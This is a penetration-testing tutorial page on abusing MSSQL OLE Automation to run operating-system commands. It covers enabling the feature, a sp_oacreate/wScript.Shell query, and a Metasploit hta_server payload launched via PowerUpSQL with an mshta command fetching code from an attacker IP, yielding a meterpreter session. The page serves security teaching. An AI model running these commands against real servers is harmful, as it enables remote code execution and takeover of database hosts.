<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ms-sql-penetration-testing/" rel="category tag">MS-SQL Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">MSSQL for Pentester: Command Execution with Ole Automation</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-ole-automation/" rel="bookmark"><time class="entry-date published" datetime="2021-08-26T16:46:13+00:00">August 26, 2021</time><time class="updated" datetime="2025-05-10T18:16:16+00:00">May 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;"><strong data-start="87" data-end="114">OLE Automation in MSSQL</strong> is a process through which an application can access and manipulate the implied objects in other applications. Hence, in this article, we will explore how to use <strong data-start="277" data-end="304">OLE automation in MSSQL</strong> to our benefit.</span></p>
<h3><span style="color: #800000;"><strong>Table of Content:</strong></span></h3>
<ul>
<li><strong><span style="color: #000000;">What is OLE Automation?</span></strong></li>
<li><strong><span style="color: #000000;">What are Facets?</span></strong></li>
<li><span style="color: #000000;"><strong>How to enable OLE Automation</strong>?</span>
<ul>
<li><span style="color: #000000;">GUI</span></li>
<li><span style="color: #000000;">CLI</span></li>
</ul>
</li>
<li><strong><span style="color: #000000;">Exploiting OLE Automation</span></strong>
<ul>
<li><span style="color: #000000;">Metasploit</span></li>
<li><span style="color: #000000;">PowerUpSQL</span></li>
</ul>
</li>
</ul>
<p><strong><span style="color: #000000;">What is OLE Automation?</span></strong></p>
<p><span style="color: #000000;">OLE stands for Object Linking and Embedding. Microsoft develops this technology to make it easier for applications to share their data. Therefore, automation enables an application to manipulate objects that are implemented in other applications. This automation server unveils its features via COM interfaces; for the different applications to read them, it further helps them automate their properties by retrieving objects and using their services.</span></p>
<p><strong><span style="color: #000000;">What are Facets?</span></strong></p>
<p><span style="color: #000000;">Facets help to manage databases through their own set of policy-based functions. When it comes to MS-SQL, it has premeditated Facets. For instance, the surface area configuration facet construes the properties that are off by default. This function comes in handy when you have multiple SQL environments. Here, you can configure a Facet in one server’s environment and copy the facet to another SQL environment by importing the copied file into an instance of the server as a policy.</span></p>
<p><strong><span style="color: #000000;">How to enable OLE automation?</span></strong></p>
<p><span style="color: #000000;">On a newly installed MS-SQL server, many instances are disabled by default. And this enabling or disabling of the functions provided by the SQL server can be done through Facets. There are two methods to allow OLE automation.</span></p>
<h3><span style="color: #800000;"><strong>GUI</strong></span></h3>
<p><span style="color: #000000;">The first method is to enable it from SQL Server Management Studio. Open the studio and right-click on the server. A drop-down menu will appear. From this menu, click on Facets. As shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kOhwW154GWo/YSe-rqOcANI/AAAAAAAAyS0/gEEGhvllMy4cNp6leUEo90PJzRhg22jBwCLcBGAsYHQ/s16000/1.png"/></span></p>
<p><span style="color: #000000;">A dialogue box will open, which will provide you with a facet drop-down list. From this drop-down list, choose Surface Area Configuration, just as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-WV7kIBTD8ec/YSe_DVBbz3I/AAAAAAAAyS8/Igmx5PQqoh09mgcPuPOiT_dZAaZYAPrLgCLcBGAsYHQ/s16000/2.png"/></span></p>
<p><span style="color: #000000;">Once you choose the Surface Area Configuration, then you can select the value <strong>true</strong> for <strong>OleAutomationEnabled </strong>from the <strong>Facet properties section</strong> as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-je_GUpMZeUE/YSe_HOg35TI/AAAAAAAAyTA/LLy6jy-M8sIVw7B65Wm80OWfGTVCglBSQCLcBGAsYHQ/s16000/3.png"/></span></p>
<p><span style="color: #000000;">After following the above steps, click on the ‘<strong>ok</strong>‘ button in the dialogue box to Enable OLE Automation.</span></p>
<h3><span style="color: #800000;"><strong>CLI</strong></span></h3>
<p><span style="color: #000000;">The second method to enable OLE automation is via SQL queries. Before we move on to the queries, let’s make one thing clear: if the value for OLE automation is 1, it is enabled. Similarly, if the value is set to 0, then it means that the OLE automation is disabled.</span></p>
<p><span style="color: #000000;">So, to confirm whether the Ole Automation is enabled or disabled, we will use the following query:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">EXEC sp_configure 'Ole Automation Procedures'; 
GO</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-iPHswqbMbVI/YSe_Kx4BhlI/AAAAAAAAyTE/3Vu1QQwd7fM84lcNRe_n2Cgz3il5SfzxgCLcBGAsYHQ/s16000/4.png"/></span></p>
<p><span style="color: #000000;">And as you can see in the image above, the <strong>config_value</strong> and <strong>run_value</strong> are 0; that means the OLE Automation is disabled. Now, to enable it to write the following query:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sp_configure 'show advanced options', 1; 
GO 
RECONFIGURE; 
GO 
sp_configure 'Ole Automation Procedures', 1; 
GO 
RECONFIGURE; 
GO</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-f0GKcQMYCUM/YSe_OWEHd7I/AAAAAAAAyTI/0dWSsLJ3BKcLywmetO3t23TcU-whlNyUwCLcBGAsYHQ/s16000/5.png"/></span></p>
<p><span style="color: #000000;">Once the query is executed, you can use the first query again to check the status of OLE automation. As you can see in the image below, the said query will change the value from 0 to 1 and enable the OLE automation in the process.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ojGwq0pYMMo/YSe_SDB64KI/AAAAAAAAyTM/jFk9_QPy5pgLEppXntJ2DK3Q0gOWiJKoACLcBGAsYHQ/s16000/6.png"/></span></p>
<h3><span style="color: #800000;">Exploiting OLE Automation</span></h3>
<p><span style="color: #000000;">Now that we have activated OLE automation, we can execute a little query to run any application. For instance, in the image below, we are entering a query for it to run the calculator. And as you can observe, the query is using COM to call upon the application. The query is :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">DECLARE @output INT
DECLARE @ProgramToRun VARCHAR(255)
SET @ProgramToRun = 'Run("calc.exe")'
EXEC sp_oacreate 'wScript.Shell', @output out
EXEC sp_oamethod @output, @ProgramToRun
EXEC sp_oadestroy @output</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Qb0TZ4QnedM/YSe_WFWapdI/AAAAAAAAyTU/AdHOhrHkAVkWr8629w9DY0gsfd99Fhe8wCLcBGAsYHQ/s16000/7.png"/></span></p>
<h3><span style="color: #800000;">Metasploit</span></h3>
<p><span style="color: #000000;">Once you run the above query, it will run the calculator application. So using this logic, we will now try and exploit this OLE automation to our benefit via Metasploit and PowerUpSQL tool. Open Metasploit and run the following set of commands to generate a hta URL, which one executed will provide us with a Metasploit session.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/misc/hta_server
set srvhost *localhost*
exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-OpgQBh_5kgo/YSe_Zhdu37I/AAAAAAAAyTc/7A9Qmsf3YZgYmAxM9fHtbpb10ntUnQT3QCLcBGAsYHQ/s16000/50.png"/></span></p>
<p><span style="color: #000000;">As expected, the above exploit generated a URL for us. Now, go to PowerShell and use the following set of commands to get the said session:</span></p>
<h3><span style="color: #800000;">PowerUpSQL</span></h3>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd PowerUpSQL-master
powershell
powershell -ep bypass
Import-Module .\PowerUpSQL.ps1
Invoke-SQLOSCmdOle -Username sa -Password Password@1 -Instance WIN-P83OS778EQK\SQLEXPRESS –Command "mshta.exe http://192.168.1.2:8080/pr2e96MyVedJ6.hta" -Verbose</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-e6zWL8gDFHI/YSe_dKtjVgI/AAAAAAAAyTk/vKDELbj7VH07cN4TxJcHwQTXxnHeqIyHwCLcBGAsYHQ/s16000/51.png"/></span></p>
<p><span style="color: #000000;">Once the above commands are executed, you will have your session as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZwthT8eb4yE/YSe_hCUNhQI/AAAAAAAAyTs/U2uVSuftz7wUjiCPyjNHL4PbLiObjwuXACLcBGAsYHQ/s16000/52.png"/></span></p>
<p><span style="color: #000000;">Note: you will only get a meterpreter session if you have access to the username and password of the server.</span></p>
<p><span style="color: #000000;">You can also run any command compatible with the server through PowerShell, as shown in the image below. Here we ran the ipconfig command to know the IP of the server. The command is:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Invoke-SQLOSCmdOle -Username sa -Password Password@1 -Instance WIN-P83OS778EQK\SQLEXPRESS –Command ipconfig -Verbose</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-IN2iKCQqPaY/YSe_k0PuIdI/AAAAAAAAyTw/WH2qe7C-rew5rf3OdIdFi1xIiu0cV_9NQCLcBGAsYHQ/s16000/55.png"/></span></p>
<p><span style="color: #000000;">Executing the above command will save the desired result in a text file in the temp folder, as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-KltFfSf1s0c/YSe_pC6zvEI/AAAAAAAAyT4/TjfnVbZ5NYoaPtm7NjOTO0lD9dD9mHxzACLcBGAsYHQ/s16000/56.png"/></span></p>
<p><span style="color: #000000;">This way, you can exploit or manipulate the OLE Automation in MSSQL to your desires. Such methods go a long way in learning as knowledge of such things helps in penetration testing of a </span><br/>
<span style="color: #000000;">MS-SQL server environment.</span></p>
<p><span style="color: #000000;"><strong>Reference</strong>:https://github.com/SofianeHamlaoui/Pentest-Notes/blob/master/Security_cheatsheets/databases/sqlserver/3-command-execution.md</span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Yashika Dhir is a Cyber Security Researcher, Penetration Tester, Red Teamer, Purple Team enthusiast. Contact her on <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/yashika-dhir/">Linkedin</a> </strong></span>and <span style="color: #0000ff;"><strong>Twitter</strong></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
